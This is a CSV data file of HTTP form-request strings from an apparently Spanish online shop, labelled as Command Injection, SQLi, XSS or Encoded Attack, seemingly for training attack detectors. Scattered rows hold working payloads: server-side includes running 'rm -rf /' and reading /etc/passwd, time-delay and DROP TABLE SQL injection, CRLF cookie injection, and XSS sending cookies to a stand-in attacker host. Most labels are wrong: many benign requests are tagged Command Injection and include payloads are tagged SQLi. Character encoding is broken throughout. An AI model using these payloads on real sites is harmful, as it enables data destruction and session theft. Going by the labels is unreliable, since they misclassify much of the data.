payload,category
registro | kentaro | vo'lframio | Sulko | Mex�a Sebastia | oliveros@errebebe.ke | 11983001R | Molinos 37  | Villanueva del Rebollar de la Sierra | 31495 | Valladolid | 2471595611305823 | Registrar HTTP/1.1,Command Injection
registro | kentaro | 4up493a562i5 | Sulko | Mex�a Sebastia | oliveros@errebebe.ke | 11983001R | Molinos 37  | Villanueva del Rebollar de la Sierra | 31495 | Valladolid | 2471595611305823 | Registrar HTTP/1.1,Command Injection
"registro | klasky | TEM.�TiCO | Licia | Maeso Comello | verrell.myral@cafedeteatro.kh | 33908887Xany%3F%0D%0ASet-cookie%3A+Tamper%3D1041264011025374727 | Plaza Pedro Marcos, 145  | Guadalupe | 36700 | C�diz | 4984450191632548 | Registrar HTTP/1.1",Command Injection
"registro | klasky | TEM.�TiCO | Licia | Maeso Comello | verrell.myral@cafedeteatro.kh | 33908887X | Plaza Pedro Marcos, 145  | <!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> | 36700 | C�diz | 4984450191632548 | Registrar HTTP/1.1",SQLi
"registro | klasky | TEM.�TiCO | Licia | Maeso Comello | verrell.myral@cafedeteatro.kh | 33908887X | Plaza Pedro Marcos, 145  | Guadalupe | 36700 | G+u*adalaj+ara | 4984450191632548 | Registrar HTTP/1.1",Command Injection
"registro | klasky | TEM.�TiCO | Licia | Maeso Comello | verrell.myral@cafedeteatro.kh | 33908887X | Plaza Pedro Marcos, 145  | Guadalupe | 36700 | C�diz | 4984450191632548 | Registrar HTTP/1.1",Command Injection
2 | Vino Rioja | %3F | 85 | A�adir al carrito HTTP/1.1,Command Injection
2 | Ques+o Manchego | 85 | 85 | A�adir al carrito HTTP/1.1,Command Injection
2 | Vino Rioja | 85 | 85 | A�adir al carrito HTTP/1.1,Command Injection
entrar | werick | 1Nt90�a9LEMen0e | off | Entrar HTTP/1.1,Command Injection
insertar | 1979 | paros%22%20style=%22background:url(javascript:alert('Paros')) HTTP/1.1,Command Injection
insertar | 1979 | Confirmar/ HTTP/1.1,Command Injection
insertar | 1979 | Pasar por caja HTTP/1.1,Command Injection
"registro | hartmann | al55nza | Randolfo | Rovirola Noiran | semmelrogge@spainpharma.zm | 73500117Ybob@<SCRipt>alert(Paros)</scrIPT>.parosproxy.org | Pl. Aranjuez, S/N  | Sobremunt | 18127 | Tarragona | 1198702099336688 | Registrar HTTP/1.1",XSS
"registro | ','0','0','0','0');waitfor delay '0:0:15';-- | al55nza | Randolfo | Rovirola Noiran | semmelrogge@spainpharma.zm | 73500117Y | Pl. Aranjuez, S/N  | Sobremunt | 18127 | Tarragona | 1198702099336688 | Registrar HTTP/1.1",SQLi
"registro | hartmann | al55nza | Randolfo | Rovirola Noiran | lorre-d@uell2@simulacion-credito.ma | 73500117Y | Pl. Aranjuez, S/N  | Sobremunt | 18127 | Tarragona | 1198702099336688 | Registrar HTTP/1.1",Command Injection
"registro | manek | di3gu6ta7a5e3t5 | Oberto | Mansur Morales | laval_koldehoff@nutrimama.sb | 73525509Y | Alarona, 52  | San Garc�a de Ingelmos';waitfor delay '0:0:15';-- | 26375 | Soria | 8551810827750150 | Registrar HTTP/1.1",SQLi
"registro | manek | <!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> | Oberto | Mansur Morales | laval_koldehoff@nutrimama.sb | 73525509Y | Alarona, 52  | San Garc�a de Ingelmos | 26375 | Soria | 8551810827750150 | Registrar HTTP/1.1",SQLi
"registro | manek | di3gu6ta7a5e3t5 | Oberto | Mansur Morales | ba@rbe@r@a2hotels.@sd | 73525509Y | Alarona, 52  | San Garc�a de Ingelmos | 26375 | Soria | 8551810827750150 | Registrar HTTP/1.1",Command Injection
"registro | manek | di3gu6ta7a5e3t5 | Oberto | Mansur Morales | laval_koldehoff@nutrimama.sb | 73525509Y | Alarona, 52  | San Garc�a de Ingelmos | 26375 | Soria | 8551810827750150 | Registrar HTTP/1.1",Command Injection
2 | Vino Rioja | 100');waitfor delay '0:0:15';-- | 83 | A�adir al carrito HTTP/1.1,SQLi
2 | Ques+o Manchego | 100 | 83 | A�adir al carrito HTTP/1.1,Command Injection
2 | Vino Rioja | 100 | 83 | A�adir al carrito HTTP/1.1,Command Injection
entrar | wendi | tracaM/unda''na | on | Entrar HTTP/1.1,Command Injection
insertar | 8453 | Confirmar/ HTTP/1.1,Command Injection
insertar | 8453 | Confirmar HTTP/1.1,Command Injection
"registro | arco | saxosa | C�sar | Nossa Vizcarrondo | kunzer.giorgelli@cochesautomaticos.kn | 64841759K | Calle Higueras, 37  | Uni�n de Campos, La | 20130 | Segovia | 1690304707007095 | '; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% HTTP/1.1",SQLi
"registro | arco | saxosa | C�sar | Nossa Vizcarrondo | kunzer.giorgelli@cochesautomaticos.kn | 64841759K | Calle Higueras, 37  | Uni�n de Campos, La | 20130 | Segovia | 1690304707007095 | Registrar HTTP/1.1",Command Injection
"registro | career | tel�grafo | Alexia | De Castro W�lker | jans@voragolive.do | 63653644V','0','0');waitfor delay '0:0:15';-- | Sanlucar La Mayor, 148,  | Atzeneta del Maestrat | 16270 | Ciudad Real | 5906206602610899 | Registrar HTTP/1.1",SQLi
"registro | sessionid=12312312& username=%3C%73%63%72%69%70%74%3E%64%6F%63%75%6D%65%6E%74%2E%6C%6F%63%61%74%69%6F%6E%3D%27%68%74%74%70%3A%2F%2F%61%74%74%61%63%6B%65%72%68%6F%73%74%2E%65%78%61%6D%70%6C%65%2F%63%67%69%2D%62%69%6E%2F%63%6F%6F%6B%69%65%73%74%65%61%6C%2E%63%67%69%3F%27%2B%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%3C%2F%73 %63%72%69%70%74%3E? | tel�grafo | Alexia | De Castro W�lker | jans@voragolive.do | 63653644V | Sanlucar La Mayor, 148,  | Atzeneta del Maestrat | 16270 | Ciudad Real | 5906206602610899 | Registrar HTTP/1.1",Command Injection
"registro | career | tel�grafo | Alexia | De Castro W�lker | men@g@@943.ch | 63653644V | Sanlucar La Mayor, 148,  | Atzeneta del Maestrat | 16270 | Ciudad Real | 5906206602610899 | Registrar HTTP/1.1",Command Injection
"registro | career | tel�grafo | Alexia | De Castro W�lker | jans@voragolive.do | 63653644V | Sanlucar La Mayor, 148,  | Atzeneta del Maestrat | 16270 | Ciudad Real | 5906206602610899 | Registrar HTTP/1.1",Command Injection
2 | Jam�n Ib�rico | 100 | 68 | A�adir al carrito HTTP/1.1,Command Injection
"entrar | auton | ag,uiJo66'35or | on | Entrar HTTP/1.1",Command Injection
entrar | auton | gubi9 | on | Entrar HTTP/1.1,Command Injection
"insertar | 5934 | Confirmar','0','0','0');waitfor delay '0:0:15';-- HTTP/1.1",SQLi
insertar | 5934 | Pasar por caja/ HTTP/1.1,Command Injection
insertar | 5934 | Confirmar HTTP/1.1,Command Injection
"registro | simler | any%3F%0D%0ASet-cookie%3A+Tamper%3D1041264011025374727%0D%0A | Trist�n | Padura Lacruz | aasen@apelton.dk | 90088544M | Gaspar Arenas 116,  | San Xo�n de R�o | 22560 | Lugo | 7844692767857454 | Registrar HTTP/1.1",Command Injection
"registro | simler | R1Al2E | Trist�n | Padura Lacruz | aasen@apelton.dk | 90088544M | Gaspar Arenas 116,  | San Xo�n de R�o | 22560 | Lugo | 899062190611389A | Registrar HTTP/1.1",Command Injection
"registro | raglin | m783a1er3 | Careli | Navines | leclerc6@soycastellano.gl | 52316705P'; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% | C/ Tavernes Blanques, S/N  | Rupi� | 21610 | Guip�zcoa | 8201185179055303 | Registrar HTTP/1.1",SQLi
"registro | raglin | m783a1er3 | Careli | Navines | leclerc6@soycastellano.gl | 52316705P | C/ Tavernes Blanques, S/N  | P?epino | 21610 | Guip�zcoa | 8201185179055303 | Registrar HTTP/1.1",Command Injection
"registro | raglin | m783a1er3 | Careli | Navines | leclerc6@soycastellano.gl | 52316705P | C/ Tavernes Blanques, S/N  | Rupi� | 21610 | Guip�zcoa | 8201185179055303 | Registrar HTTP/1.1",Command Injection
1 | Queso Manchego | bob@<SCRipt>alert(Paros)</scrIPT>.parosproxy.org | 25 | A�adir al carrito HTTP/1.1,XSS
1 | Queso Manchego | 100/ | 25 | A�adir al carrito HTTP/1.1,Command Injection
1 | Queso Manchego | 85 | 25 | A�adir al carrito HTTP/1.1,Command Injection
entrar | apollo | hepta8qu�a | off | Entrarany%0ASet-cookie%3A+Tamper%3D1041264011025374727 HTTP/1.1,Command Injection
entrar | apollo | hepta8qu�a | bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org | Entrar HTTP/1.1,Command Injection
"entrar | apollo | n79t,300471 | off | Entrar HTTP/1.1",Command Injection
entrar | apollo | hepta8qu�a | off | Entrar HTTP/1.1,Command Injection
"<!--#include file=""archivo_secreto"" --> | 3086 | Pasar por caja HTTP/1.1",SQLi
insertar | 3086 | Pasar por caja HTTP/1.1,Command Injection
"registro | mcdowall | 7820ITuIr | Laurencio | Irigoyen Bombard� | rueda.unicorn@tiposdedrogas.je | 92997163K | Avenida San Ignacio De Loyola 128 8?C | Chillu�var | 05279 | Barcelona | 0602317509119469<!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> | Registrar HTTP/1.1",SQLi
"','0');waitfor delay '0:0:15';-- | mcdowall | 7820ITuIr | Laurencio | Irigoyen Bombard� | rueda.unicorn@tiposdedrogas.je | 92997163K | Avenida San Ignacio De Loyola 128 8?C | Chillu�var | 05279 | Barcelona | 0602317509119469 | Registrar HTTP/1.1",SQLi
"registro | mcdowall | 7820ITuIr | S,ilvestre | Irigoyen Bombard� | rueda.unicorn@tiposdedrogas.je | 92997163K | Avenida San Ignacio De Loyola 128 8?C | Chillu�var | 05279 | Barcelona | 0602317509119469 | Registrar HTTP/1.1",Command Injection
registro | mcdowall | 7820ITuIr | Laurencio | Irigoyen Bombard� | rueda.unicorn@tiposdedrogas.je | 92997163K | Avenida San Ignacio De Loyola 128 8?C | Chillu�var | 05279 | Barcelona | 0602317509119469 | Registrar HTTP/1.1,Command Injection
"registro | blakesle | ch07ico3o | Jerem�as | Maslo Arrunategui | ratcliff@mataroweb.gw | 26853011M | Calle Felipe De Diego 191, 2Hparos%22+style%3D%22background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29&id=2 | Montefr�o | 36520 | Burgos | 3246825984475356 | Registrar HTTP/1.1",Command Injection
"registro | blakesle | ch07ico3o | Jerem�as | <SCRIPT>alert(""Paros"");</SCRIPT> | ratcliff@mataroweb.gw | 26853011M | Calle Felipe De Diego 191, 2H | Montefr�o | 36520 | Burgos | 3246825984475356 | Registrar HTTP/1.1",XSS
"registro | amm*a*mari | ch07ico3o | Jerem�as | Maslo Arrunategui | ratcliff@mataroweb.gw | 26853011M | Calle Felipe De Diego 191, 2H | Montefr�o | 36520 | Burgos | 3246825984475356 | Registrar HTTP/1.1",Command Injection
"registro | blakesle | ch07ico3o | Jerem�as | Maslo Arrunategui | ratcliff@mataroweb.gw | 26853011M | Calle Felipe De Diego 191, 2H | Montefr�o | 36520 | Burgos | 3246825984475356 | Registrar HTTP/1.1",Command Injection
3any%0D%0ASet-cookie%3A+Tamper%3D5765205567234876235 | Vino Rioja | 39 | 40 | A�adir al carrito HTTP/1.1,Command Injection
3 | Vino Rioja | 39 | 40 | A�adir al carrito HTTP/1.1,Command Injection
entrar | shyokoAND 1=1 | acarrear | off | Entrar HTTP/1.1,Command Injection
entrar | any%3F%0ASet-cookie%3A+Tamper%3D5765205567234876235 | acarrear | off | Entrar HTTP/1.1,Command Injection
entrar | mcmul+l?in | acarrear | off | Entrar HTTP/1.1,Command Injection
insertar | 5151paros%22%20style=%22background:url(javascript:alert('Paros')) | Confirmar HTTP/1.1,Command Injection
insertar | Set-cookie%3A+Tamper%3D1041264011025374727 | Confirmar HTTP/1.1,Command Injection
insertar | 5151 | Confirmar/ HTTP/1.1,Command Injection
insertar | 5151 | Confirmar HTTP/1.1,Command Injection
"registro | gert | impla6ica1le | C,iro | Serracana Abt | dear_terr@nikemujeres.sc | 13843179P | C/ Puerto, 118,  | L�jar | 09226 | Tarragona | 8001816720505449 | Registrar HTTP/1.1",Command Injection
"registro | stokker | do6a3er8 | Leandra | Orpez Almod�var | schaab@hispadis.li | 96068417Q? | Calle Montduber 75, 12?H | Magacela | 04275 | Lleida | 1530487510362018 | Registrar HTTP/1.1",Command Injection
"registro | stokker | do6a3er8 | Leandra | Orpez Almod�var | schaab@hispadis.li | 96068417Q | Calle Montduber 75, 12?H | Magacela | 04275 | Lleida | | | Registrar HTTP/1.1",Command Injection
"registro | stokker | do6a3er8 | Leandra | Orpez Almod�var | schaab@hispadis.li | 96068417Q | Calle Montduber 75, 12?H | Magacela | 04275 | Lleida | 272896003555179 | Registrar HTTP/1.1",Command Injection
"registro | stokker | do6a3er8 | Leandra | Orpez Almod�var | schaab@hispadis.li | 96068417Q | Calle Montduber 75, 12?H | Magacela | 04275 | Lleida | 1530487510362018 | Registrar HTTP/1.1",Command Injection
1 | Ques+o Manchego | 85 | 48 | A�adir al carrito HTTP/1.1,Command Injection
1 | Vino Rioja | 85 | 48 | A�adir al carrito HTTP/1.1,Command Injection
entrar | zampino | mILonGa | on | ' AND '1'='1 HTTP/1.1,Command Injection
entrar | zampino | mILonGa | on/ | Entrar HTTP/1.1,Command Injection
entrar | zampino | mILonGa | on | Entrar HTTP/1.1,Command Injection
insertar | 4461 | Confirmar/ HTTP/1.1,Command Injection
insertar | 4461 | Confirmar HTTP/1.1,Command Injection
registro | student'INJECTED_PARAM | ali0557ra | Jaled | Miralles Casola | manni@yiutuve.mk | 37782618N | Travessera De Gracia 53  | Tollos | 23264 | Pontevedra | 5024784015351535 | Registrar HTTP/1.1,Command Injection
registro | bob@<SCRipt>alert(Paros)</scrIPT>.parosproxy.org | ali0557ra | Jaled | Miralles Casola | manni@yiutuve.mk | 37782618N | Travessera De Gracia 53  | Tollos | 23264 | Pontevedra | 5024784015351535 | Registrar HTTP/1.1,XSS
registro | student | ali0557ra | Jaled | Miralles Casola | manni@yiutuve.mk | 37782618N | Travessera De Gracia 53  | Tollos | 23264 | Barcelo*na | 5024784015351535 | Registrar HTTP/1.1,Command Injection
registro | student | ali0557ra | Jaled | Miralles Casola | manni@yiutuve.mk | 37782618N | Travessera De Gracia 53  | Tollos | 23264 | Pontevedra | 5024784015351535 | Registrar HTTP/1.1,Command Injection
registro | marymarg | m1r66m7$o | Barbarina | Hodzic Fajardo | bibb@yksoluap.io | A097A2A7Q | Carlos Piornos 41 11E | Sant Boi de Llobregat | 46507 | Zamora | 5592242504094790 | Registrar HTTP/1.1,Command Injection
registro | marymarg | m1r66m7$o | Barbarina | Hodzic Fajardo | bibb@yksoluap.io | 05554476E | Carlos Piornos 41 11E | Sant Boi de Llobregat | 46507 | Zamora | 5592242504094790 | Registrar HTTP/1.1,Command Injection
"2 | Queso Manchego | 85 | 28 | "" AND ""1""=""1 HTTP/1.1",Command Injection
2 | Queso Manchego | 85 | 28 | A�adir al carrito HTTP/1.1,Command Injection
entrar | trindy | pinTOR | off/ | Entrar HTTP/1.1,Command Injection
insertar | 4320any%3F%0D%0ASet-cookie%3A+Tamper%3D1041264011025374727 | Pasar por caja HTTP/1.1,Command Injection
insertar | 4320 | Pasar por caja/ HTTP/1.1,Command Injection
insertar | 4320 | Pasar por caja HTTP/1.1,Command Injection
"registro | jada | 0a3gan861 | AsadAND 1=1 | Tarraubella Grajera | seward_sepulvede@promotorareina.bt | 05599581R | Cuesta Del Mercadillo, 30  | Valdemeca | 44367 | Palencia | 2588788031004045 | Registrar HTTP/1.1",Command Injection
"registro | jada | 0a3gan861 | Asad | sessionid=12312312& username=<script>document.location='http://hacker .example.com/cgi-bin/cookiesteal.cgi?'+ document.cookie</script> | seward_sepulvede@promotorareina.bt | 05599581R | Cuesta Del Mercadillo, 30  | Valdemeca | 44367 | Palencia | 2588788031004045 | Registrar HTTP/1.1",XSS
"registro | jada | 0a3gan861 | Asad | Tarraubella Grajera | seward_sepulvede@promotorareina.bt | 577B80594V | Cuesta Del Mercadillo, 30  | Valdemeca | 44367 | Palencia | 2588788031004045 | Registrar HTTP/1.1",Command Injection
"registro | jada | 0a3gan861 | Asad | Tarraubella Grajera | seward_sepulvede@promotorareina.bt | 05599581R | Cuesta Del Mercadillo, 30  | Valdemeca | 44367 | Palencia | 2588788031004045 | Registrar HTTP/1.1",Command Injection
"registro | kelli | resca�o | An�car | Bastus Pellini | wiley@pintandomucho.va | 65763257R | C/ Cases Noves, 98,  | Gomesende | 41540 | �vila| | 2592750778275929 | Registrar HTTP/1.1",Command Injection
"registro | kelli | resca�o | An�car | Bastus Pellini | wiley@pintandomucho.va | 65763257R | C/ Cases Noves, 98,  | Gomesende | <!--#include file=""archivo_secreto"" --> | �vila | 2592750778275929 | Registrar HTTP/1.1",SQLi
"registro | kelli | resca�o | An�car | Bastus Pellini | wiley@pintandomucho.va | 65763257R | C/ Cases Noves, 98,  | Gomesende | 41540 | G+uadalajara | 2592750778275929 | Registrar HTTP/1.1",Command Injection
"registro | kelli | resca�o | An�car | Bastus Pellini | wiley@pintandomucho.va | 65763257R | C/ Cases Noves, 98,  | Gomesende | 41540 | �vila | 2592750778275929 | Registrar HTTP/1.1",Command Injection
2 | Jam�n Ib�rico | 100 | 89 | A�adir al carrito HTTP/1.1,Command Injection
entrar | iseno**r | 0axmord�n | off | Entrar HTTP/1.1,Command Injection
entrar | ashley | 0axmord�n | off | Entrar HTTP/1.1,Command Injection
insertar | 3796%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E | Pasar por caja HTTP/1.1,Command Injection
insertar | 3796 | bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org HTTP/1.1,Command Injection
insertar | 3796 | Pasar por caja/ HTTP/1.1,Command Injection
insertar | 3796 | Pasar por caja HTTP/1.1,Command Injection
"registro | terryl | des9erco | Haroid | Dawaher | tchkhikvadze-castenada3@soymadrile�o.mu | 14559882P | C/ Doctor Francisco Saiz Sanz, 159, ','0','0');waitfor delay '0:0:15';-- | Alberca, La | 03770 | Salamanca | 3772824400880183 | Registrar HTTP/1.1",SQLi
"registro | terryl | des9erco | Haroid | Dawaher | 'INJECTED_PARAM | 14559882P | C/ Doctor Francisco Saiz Sanz, 159,  | Alberca, La | 03770 | Salamanca | 3772824400880183 | Registrar HTTP/1.1",Command Injection
"registro | terryl | des9erco | Haroid | Dawaher | tchkhikvadze-castenada3@soymadrile�o.mu | 14559882P | C/ Doctor Francisco Saiz Sanz, 159,  | Alberca, La | 03770 | Salamanca | 3772824400880183 | Registrar HTTP/1.1",Command Injection
"registro | clark-st | 4A4R5R | Semiramis | Chapi Vieira | tirard_lamore@biosoftware.cv | 88665105J | Calle Miguel Romero Matinez S/N,  | Sayalonga | 09227 | L?a Ri?oj*a | 2618138569718823 | Registrar HTTP/1.1",Command Injection
"registro | clark-st | 4A4R5R | Semiramis | Chapi Vieira | tirard_lamore@biosoftware.cv | 88665105J | Calle Miguel Romero Matinez S/N,  | Sayalonga | 09227 | Zamora | 2618138569718823 | Registrar HTTP/1.1",Command Injection
@40 | Jam�n Ib�rico | 100 | 59 | A�adir al carrito HTTP/1.1,Command Injection
entrar | yale | 2NcOJa7 | on' DELETE FROM USERS | Entrar HTTP/1.1,Command Injection
entrar | yale | d/esp/epI'Tar | on | Entrar HTTP/1.1,Command Injection
entrar | yale | 2NcOJa7 | on | Entrar HTTP/1.1,Command Injection
1any%3F%0D%0ASet-cookie%3A+Tamper%3D1041264011025374727%0D%0A HTTP/1.1,Encoded Attack
insertar | 51 | Confirmar HTTP/1.1,Command Injection
"registro | mirabell | implIcaNte','0');waitfor delay '0:0:15';-- | Yayn | Boliart Jubert | karlatos-woodcroft@joyaseleccion.fr | 90456703A | Avenida Vigo 194  | Olula de Castro | 07195 | Cuenca | 6879168763922210 | Registrar HTTP/1.1",SQLi
registro | mirabell | implIcaNte | Yayn | Boliart Jubert | karlatos-woodcroft@joyaseleccion.fr | 321B59898X | Avenida Vigo 194  | Olula de Castro | 07195 | Cuenca | 6879168763922210 | Registrar HTTP/1.1,Command Injection
"registro | sena | Mata_3OLvO | Rut | Valiente Mu�umer | lanyon_guerrasio@automovilesalhambra.um | 97238430L | Calle Granada, 85  | Monistrol de Calders | 10140 | .Guad+ala.jara | 9959544300389605 | Registrar HTTP/1.1",Command Injection
"registro | sena | Mata_3OLvO | Rut | Valiente Mu�umer | lanyon_guerrasio@automovilesalhambra.um | 97238430L | Calle Granada, 85  | Monistrol de Calders | 10140 | Le�n | 9959544300389605 | Registrar HTTP/1.1",Command Injection
3 | Queso Manchego | 85 | 57 | sessionid=12312312& username=%3C%73%63%72%69%70%74%3E%64%6F%63%75%6D%65%6E%74%2E%6C%6F%63%61%74%69%6F%6E%3D%27%68%74%74%70%3A%2F%2F%61%74%74%61%63%6B%65%72%68%6F%73%74%2E%65%78%61%6D%70%6C%65%2F%63%67%69%2D%62%69%6E%2F%63%6F%6F%6B%69%65%73%74%65%61%6C%2E%63%67%69%3F%27%2B%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%3C%2F%73 %63%72%69%70%74%3E? HTTP/1.1,Command Injection
3 | Queso Manchego | 39/ | 57 | A�adir al carrito HTTP/1.1,Command Injection
3 | Queso Manchego | 85 | 57 | A�adir al carrito HTTP/1.1,Command Injection
entrar | kolahi45 | pr0to | on | sessionid=12312312& username=<script>document.location='http://hacker .example.com/cgi-bin/cookiesteal.cgi?'+ document.cookie</script> HTTP/1.1,XSS
"entrar | kolahi45 | 69'c48Ng,7,7A | on | Entrar HTTP/1.1",Command Injection
entrar | kolahi45 | pr0to | on | Entrar HTTP/1.1,Command Injection
insertarany%3F%0D%0ASet-cookie%3A+Tamper%3D1041264011025374727 | 7931 | Confirmar HTTP/1.1,Command Injection
insertar | 7931 | Pasar por caja/ HTTP/1.1,Command Injection
insertar | 7931 | Confirmar HTTP/1.1,Command Injection
"registro | winsberg | flagicio | Lihuel | Novell Abenoza | hasserman@clinicadentalsansalvador.ua | 95659491F | Federico Garcia Lorca, 132,  | Riudoms | 36960 | ';waitfor delay '0:0:15';-- | 1343774789684603 | Registrar HTTP/1.1",SQLi
"registro | winsberg | flagicio | Lihuel | Novell Abenoza | hasserman@clinicadentalsansalvador.ua | 95659491F | *Vila-nova, 139  | Riudoms | 36960 | Burgos | 1343774789684603 | Registrar HTTP/1.1",Command Injection
"registro | winsberg | flagicio | Lihuel | Novell Abenoza | hasserman@clinicadentalsansalvador.ua | 95659491F | Federico Garcia Lorca, 132,  | Riudoms | 36960 | Burgos | 1343774789684603 | Registrar HTTP/1.1",Command Injection
"registro | maupin | pu552lmen34 | Ta�s | Yepes Vall | sova@tarifasdevuelos.ml | 74740920M | Lanzarote, 37  | Cat� | 2631A | Zamora | 3946035396869059 | Registrar HTTP/1.1",Command Injection
"registro | maupin | pu552lmen34 | Ta�s | Yepes Vall | sova@tarifasdevuelos.ml | 74740920M | Lanzarote, 37  | Cat� | 25403 | Zamora | 3946035396869059 | Registrar HTTP/1.1",Command Injection
1 | Vino Rioja | 39 | 75 | A�adir al carritoparos%22%20style=%22background:url(javascript:alert('Paros')) HTTP/1.1,Command Injection
1 | Vino Rioja | 39 | 75 | A�adir al carrito HTTP/1.1,Command Injection
"entrar | rogge | mella | on | Entrar"" AND ""1""=""1 HTTP/1.1",Command Injection
entrar | rogge | mella | on | paros%22%20style=%22background:url(javascript:alert('Paros')) HTTP/1.1,Command Injection
entrar | rogge | mella | off/ | Entrar HTTP/1.1,Command Injection
entrar | rogge | mella | on | Entrar HTTP/1.1,Command Injection
insertar | 8305 | Confirmar/ HTTP/1.1,Command Injection
insertar | 8305 | Confirmar HTTP/1.1,Command Injection
"registro | veen | sar*gent�a | Vigilio | Mitjavila Oca | seeck@lawn.gu | 29573614F | Calle Ripolles 83,  | Valderr�bano | 16812 | Valencia<!--#EXEC cmd=""ls /""--> | 7619192104254644 | Registrar HTTP/1.1",SQLi
"registro | veen | sar*gent�a | Vigilio | Mitjavila Oca | seeck@lawn.gu | ' AND '1'='1 | Calle Ripolles 83,  | Valderr�bano | 16812 | Valencia | 7619192104254644 | Registrar HTTP/1.1",Command Injection
"registro | veen | sar*gent�a | Vigilio | Mitjavila Oca | g@anor@@goscan@.uz | 29573614F | Calle Ripolles 83,  | Valderr�bano | 16812 | Valencia | 7619192104254644 | Registrar HTTP/1.1",Command Injection
"registro | veen | sar*gent�a | Vigilio | Mitjavila Oca | seeck@lawn.gu | 29573614F | Calle Ripolles 83,  | Valderr�bano | 16812 | Valencia | 7619192104254644 | Registrar HTTP/1.1",Command Injection
"registro | winne | iNGoBeRNaBLe | Herm�n | Hinestrosa | dacgmine@lecriture.mw | 65421136M | Calle Escultor Piquer, S/N, | | Velilla | 26210 | Barcelona | 1278501676319264 | Registrar HTTP/1.1",Command Injection
"AND 1=1 | winne | iNGoBeRNaBLe | Herm�n | Hinestrosa | dacgmine@lecriture.mw | 65421136M | Calle Escultor Piquer, S/N,  | Velilla | 26210 | Barcelona | 1278501676319264 | Registrar HTTP/1.1",Command Injection
"2 | Vino Rioja<SCRIPT>alert(""Paros"");</SCRIPT> | 39 | 2 | A�adir al carrito HTTP/1.1",XSS
"<!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> | Vino Rioja | 39 | 2 | A�adir al carrito HTTP/1.1",SQLi
2 | Vino .*?Rioja | 39 | 2 | A�adir al carrito HTTP/1.1,Command Injection
2 | Vino Rioja | 39 | 2 | A�adir al carrito HTTP/1.1,Command Injection
entrar | gun | imp716a0le | on/ | Entrar HTTP/1.1,Command Injection
entrar | gun | imp716a0le | on | Entrar HTTP/1.1,Command Injection
insertar | 2545 | Pasar por caja/ HTTP/1.1,Command Injection
"registro | strucche | corcheta | C�stulo | Pelayo Petit | baio@misanimalesdomesticos.coop | 93042317A | Veracruz, S/N 2?F | Manzaneda | 40130 | L/+lei?da | 6073015432494873 | Registrar HTTP/1.1",Command Injection
"registro | strucche | corcheta | C�stulo | Pelayo Petit | baio@misanimalesdomesticos.coop | 93042317A | Veracruz, S/N 2?F | Manzaneda | 40130 | Valladolid | 6073015432494873 | Registrar HTTP/1.1",Command Injection
"registro | myong | colOrISmo | Dagmar | Cabane Molas | holton@enigmatico.vu | 91624095F | Don Ferreol Hernandez S/N,  | Calders | 37183 | Salamancaany%3F%0D%0ASet-cookie%3A+Tamper%3D1041264011025374727 | 6035116303925311 | Registrar HTTP/1.1",Command Injection
"registro | myong | colOrISmo | Dagmar | Cabane Molas | holton@enigmatico.vu | 91624095F | Don Ferreol Hernandez S/N,  | Calders | 37183 | Salamanca | 6035116303925311 | bob@<SCRipt>alert(Paros)</scrIPT>.parosproxy.org HTTP/1.1",XSS
"registro | myong | colOrISmo | Dagmar | Cabane Molas | holton@enigmatico.vu | 91624095F | Don Ferreol Hernandez S/N,  | Calders | 37183 | Salamanca | 6035116303925311 | Registrar HTTP/1.1",Command Injection
1 | Jam�n Ib�rico | 85 | 60' DELETE FROM USERS | A�adir al carrito HTTP/1.1,Command Injection
1 | Jam�n Ib�rico | 85/ | 60 | A�adir al carrito HTTP/1.1,Command Injection
1 | Jam�n Ib�rico | 85 | 60 | A�adir al carrito HTTP/1.1,Command Injection
"entrar | gavens0 | <!--#EXEC cmd=""ls /""--> | on | Entrar HTTP/1.1",SQLi
entrar | gavens0 | b99e4ic5ino | off/ | Entrar HTTP/1.1,Command Injection
insertarbob@<SCRipt>alert(Paros)</scrIPT>.parosproxy.org | 2114 | Pasar por caja HTTP/1.1,XSS
